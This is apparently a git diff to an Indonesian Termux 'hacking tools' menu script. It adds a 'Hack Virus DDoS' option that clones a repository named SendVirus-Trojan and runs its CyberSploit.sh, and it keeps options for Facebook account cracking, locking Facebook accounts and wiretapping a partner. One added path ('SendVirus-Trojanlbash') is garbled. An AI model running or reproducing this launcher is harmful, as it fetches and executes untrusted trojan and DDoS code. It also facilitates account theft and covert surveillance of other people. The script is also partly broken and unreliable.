@@ -1,4 +1,5 @@
-#!/bin/bash
+# jangan recode mulu
+# dasar Kang recode
 
 figlet Tools | lolcat
 figlet Termux | lolcat
@@ -22,7 +23,8 @@ echo $red   "5). Sadap Pacar"
 echo $red   "6). Tampilan Termux"
 echo $red   "7). Root Termux 2021"
 echo $red   "8). Locked FB"
-echo $red   "9). Back Crack FB"
+echo $red   "9). Hack Crack FB"
+echo $red   "10). Hack Virus DDoS"
 echo $red   "99). KELUAR SANA"
 echo $black "+++++++++++++++++++++++++++++"
 read -p     "Pilih Cepat Ngab :" santai
@@ -85,6 +87,14 @@ then
    git clone https://github.com/pashayogi/Fb-hack
       cd Fb-hack
         python2 FB-HACK.py
+fi
+if [ $santai = "10" ]
+then
+echo "Passwordnya = CyberSploit"
+echo "Username = Nymouse-X"
+   git clone https://github.com/Nymouse-X/SendVirus-Trojan
+      cd SendVirus-Trojanlbash
+        bash CyberSploit.sh
 fi
 if [ $santai = "99" ]
 then
